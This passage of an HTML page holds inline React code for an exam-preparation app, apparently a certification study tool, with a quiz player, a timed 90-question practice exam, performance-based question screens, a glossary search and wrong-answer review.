          <div className="score-display" style={{color:pct>=85?'#10b981':pct>=70?'#f59e0b':'#ef4444'}}>{pct}%</div>
          <p>{score} / {qs.length} correct</p>
          <div style={{marginTop:'24px'}}>
            <button className="btn btn-primary" onClick={() => setShowGap(true)}>Gap Analysis</button>
            <button className="btn btn-secondary" style={{marginLeft:'8px'}} onClick={onBack}>Back</button>
          </div>
        </div>
      </div>
    );
  }
  
  const handleSubmit = () => {
    if (sel === null) return;
    setShowFb(true);
    setAnswers(prev => ({...prev, [cur]: sel}));
    if (sel !== q.correct) {
      onWrongAnswer({ question: q, userAnswer: sel });
    }
  };
  
  return (
    <div className="container">
      <div className="header">
        <span>Q{cur+1}/{qs.length}</span>
        <span className="badge" style={{background:domain.color}}>D{q.domain}</span>
      </div>
      <div className="question-card">
        <p style={{marginBottom:'20px'}}>{q.question}</p>
        {q.options.map((o,i) => (
          <div key={i} className={`option ${sel===i?'selected':''} ${showFb && i===q.correct?'correct':''} ${showFb && sel===i && i!==q.correct?'incorrect':''}`}
            onClick={() => !showFb && setSel(i)}>
            <strong>{String.fromCharCode(65+i)}.</strong> {o}
          </div>
        ))}
        {showFb && (
          <div className={`feedback ${sel===q.correct?'correct':'incorrect'}`}>
            <strong>{sel===q.correct?' Correct!':' Incorrect'}</strong>
            <p style={{marginTop:'8px'}}>{q.explanation}</p>
          </div>
        )}
        <div style={{marginTop:'20px',display:'flex',justifyContent:'space-between'}}>
          <span style={{color:'#71717a'}}>Score: {score}/{cur+(showFb?1:0)}</span>
          {!showFb ? <button className="btn btn-primary" onClick={handleSubmit} disabled={sel===null}>Submit</button>
            : <button className="btn btn-primary" onClick={() => {if(cur<qs.length-1){setCur(cur+1);setSel(null);setShowFb(false);}else setDone(true);}}>{cur<qs.length-1?'Next':'Results'}</button>}
        </div>
      </div>
    </div>
  );
}

function PracticeExam({ onBack, onNavigate, onWrongAnswer }) {
  const [stage, setStage] = useState('intro');
  const [qs, setQs] = useState([]);
  const [cur, setCur] = useState(0);
  const [ans, setAns] = useState({});
  const [time, setTime] = useState(90*60);
  const [done, setDone] = useState(false);
  const [showGap, setShowGap] = useState(false);
  
  useEffect(() => {
    const q = [];
    DOMAINS.forEach(d => {
      const pool = QUESTIONS.filter(x => x.domain === d.id);
      q.push(...pool.sort(() => Math.random() - 0.5).slice(0, Math.round(90 * d.weight / 100)));
    });
    setQs(q.sort(() => Math.random() - 0.5).slice(0, 90));
  }, []);
  
  useEffect(() => {
    if (stage !== 'exam' || done) return;
    const t = setInterval(() => setTime(x => x <= 1 ? (handleFinish(), 0) : x - 1), 1000);
    return () => clearInterval(t);
  }, [stage, done]);
  
  const handleFinish = () => {
    setDone(true);
    // Record wrong answers
    qs.forEach((q, i) => {
      if (ans[i] !== undefined && ans[i] !== q.correct) {
        onWrongAnswer({ question: q, userAnswer: ans[i] });
      }
    });
  };
  
  if (stage === 'intro') {
    return (
      <div className="container">
        <div className="header"><button className="nav-btn" onClick={onBack}> Back</button></div>
        <div className="card" style={{textAlign:'center'}}>
          <h2>Practice Exam</h2>
          <div style={{display:'flex',justifyContent:'center',gap:'40px',margin:'30px 0'}}>
            <div><div style={{fontSize:'2rem',fontWeight:'bold'}}>90</div><div style={{color:'#a1a1aa'}}>Questions</div></div>
            <div><div style={{fontSize:'2rem',fontWeight:'bold'}}>90</div><div style={{color:'#a1a1aa'}}>Minutes</div></div>
            <div><div style={{fontSize:'2rem',fontWeight:'bold'}}>75%</div><div style={{color:'#a1a1aa'}}>To Pass</div></div>
          </div>
          <button className="btn btn-primary" onClick={() => setStage('exam')}>Start Exam</button>
        </div>
      </div>
    );
  }
  
  if (done) {
    let s = 0; qs.forEach((q,i) => { if(ans[i] === q.correct) s++; });
    const pct = Math.round((s/qs.length)*100);
    if (showGap) {
      return (
        <div className="container">
          <div className="header"><button className="nav-btn" onClick={onBack}> Back</button></div>
          <GapAnalysis results={ans} questions={qs} onRemediate={(rem) => onNavigate('simulation', rem)} onClose={() => setShowGap(false)} />
        </div>
      );
    }
    return (
      <div className="container">
        <div className="header"><button className="nav-btn" onClick={onBack}> Back</button></div>
        <div className="card" style={{textAlign:'center'}}>
          <h2>Exam Complete!</h2>
          <div className="score-display" style={{color:pct>=75?'#10b981':'#ef4444'}}>{pct}%</div>
          <p>{s} / {qs.length} correct</p>
          <p style={{marginTop:'16px',fontSize:'1.5rem'}}>{pct >= 75 ? ' PASSED!' : ' Need 75%'}</p>
          <button className="btn btn-primary" style={{marginTop:'24px'}} onClick={() => setShowGap(true)}>Gap Analysis</button>
        </div>
      </div>
    );
  }
  
  const q = qs[cur]; if (!q) return null;
  return (
    <div className="container">
      <div className="header">
        <span>Q{cur+1}/90</span>
        <span className="timer">{Math.floor(time/60)}:{(time%60).toString().padStart(2,'0')}</span>
        <button className="btn btn-danger" onClick={handleFinish}>End</button>
      </div>
      <div className="question-card">
        <p style={{marginBottom:'20px'}}>{q.question}</p>
        {q.options.map((o,i) => (
          <div key={i} className={`option ${ans[cur]===i?'selected':''}`} onClick={() => setAns({...ans,[cur]:i})}>
            <strong>{String.fromCharCode(65+i)}.</strong> {o}
          </div>
        ))}
      </div>
      <div style={{display:'flex',justifyContent:'space-between',marginTop:'16px'}}>
        <button className="btn btn-secondary" onClick={() => setCur(Math.max(0,cur-1))} disabled={cur===0}> Prev</button>
        <button className="btn btn-primary" onClick={() => setCur(Math.min(qs.length-1,cur+1))} disabled={cur===qs.length-1}>Next </button>
      </div>
      <div style={{marginTop:'20px',display:'flex',flexWrap:'wrap',gap:'4px'}}>
        {qs.map((q,i) => (
          <div key={i} onClick={() => setCur(i)} style={{
            width:'28px',height:'28px',borderRadius:'4px',display:'flex',alignItems:'center',justifyContent:'center',cursor:'pointer',fontSize:'0.75rem',
            background: i===cur ? '#6366f1' : ans[i]!==undefined ? '#27272a' : '#18181b',
            border: `1px solid ${i===cur ? '#6366f1' : '#3f3f46'}`
          }}>{i+1}</div>
        ))}
      </div>
    </div>
  );
}

function SinglePBQ({ pbq, onBack }) {
  const [score, setScore] = useState(null);
  const domain = DOMAINS.find(d => d.id === pbq.domain);
  return (
    <div className="container">
      <div className="header"><button className="nav-btn" onClick={onBack}> Back</button><span className="badge" style={{background:domain?.color}}>D{pbq.domain}</span></div>
      <div className="card">
        <h3 style={{color:domain?.color,marginBottom:'16px'}}>{pbq.title}</h3>
        {pbq.type === 'drag-drop' && <DragDropPBQ pbq={pbq} onComplete={(c,t) => setScore({c,t})} />}
        {pbq.type === 'matching' && <MatchingPBQ pbq={pbq} onComplete={(c,t) => setScore({c,t})} />}
        {pbq.type === 'ordering' && <OrderingPBQ pbq={pbq} onComplete={(c,t) => setScore({c,t})} />}
        {score && <div style={{marginTop:'20px',textAlign:'center'}}><p>Score: {score.c}/{score.t} ({Math.round((score.c/score.t)*100)}%)</p></div>}
      </div>
    </div>
  );
}

function Glossary({ onBack }) {
  const [search, setSearch] = useState('');
  const filtered = GLOSSARY.filter(g => g.term.toLowerCase().includes(search.toLowerCase()) || g.definition.toLowerCase().includes(search.toLowerCase()));
  return (
    <div className="container">
      <div className="header"><button className="nav-btn" onClick={onBack}> Back</button><h2>Glossary ({GLOSSARY.length})</h2></div>
      <input className="search-input" placeholder="Search..." value={search} onChange={e => setSearch(e.target.value)} />
      {filtered.map((g,i) => <div key={i} className="card"><h4 style={{color:'#6366f1',marginBottom:'8px'}}>{g.term}</h4><p>{g.definition}</p></div>)}
    </div>
  );
}

function App() {
  const [view, setView] = useState('hub');
  const [data, setData] = useState(null);
  const [wrongAnswers, setWrongAnswers] = useState([]);
  
  const nav = (v, d = null) => { setView(v); setData(d); window.scrollTo(0, 0); };
  
  const addWrongAnswer = (item) => {
    setWrongAnswers(prev => {
      // Avoid duplicates
      if (prev.some(w => w.question.id === item.question.id)) return prev;
      return [...prev, item];
    });
  };
  
  const clearWrongAnswers = () => setWrongAnswers([]);
  
  switch (view) {
    case 'hub': return <Hub onNavigate={nav} wrongCount={wrongAnswers.length} />;
    case 'domain': return <DomainView domainId={data} onNavigate={nav} onBack={() => nav('hub')} />;
    case 'lesson': return <LessonViewer lesson={data} onBack={() => nav('domain', data.domain)} />;
    case 'simulation': return <SimulationPlayer simulation={data} onBack={() => nav('domain', data.domain)} onNavigate={nav} />;
    case 'quiz': return <QuizPlayer config={data} onBack={() => nav('domain', data.domainId)} onNavigate={nav} onWrongAnswer={addWrongAnswer} />;
    case 'practice': return <PracticeExam onBack={() => nav('hub')} onNavigate={nav} onWrongAnswer={addWrongAnswer} />;
    case 'pbq': return <PBQPlayer onBack={() => nav('hub')} />;
    case 'pbq-single': return <SinglePBQ pbq={data} onBack={() => nav('domain', data.domain)} />;
    case 'glossary': return <Glossary onBack={() => nav('hub')} />;
    case 'flashcards': return <Flashcards onBack={() => nav('hub')} />;
    case 'wrong': return <WrongAnswerReview wrongAnswers={wrongAnswers} onBack={() => nav('hub')} onClear={clearWrongAnswers} />;
    default: return <Hub onNavigate={nav} wrongCount={wrongAnswers.length} />;
  }
}

ReactDOM.render(<App />, document.getElementById('root'));
</script>
</body>
</html>
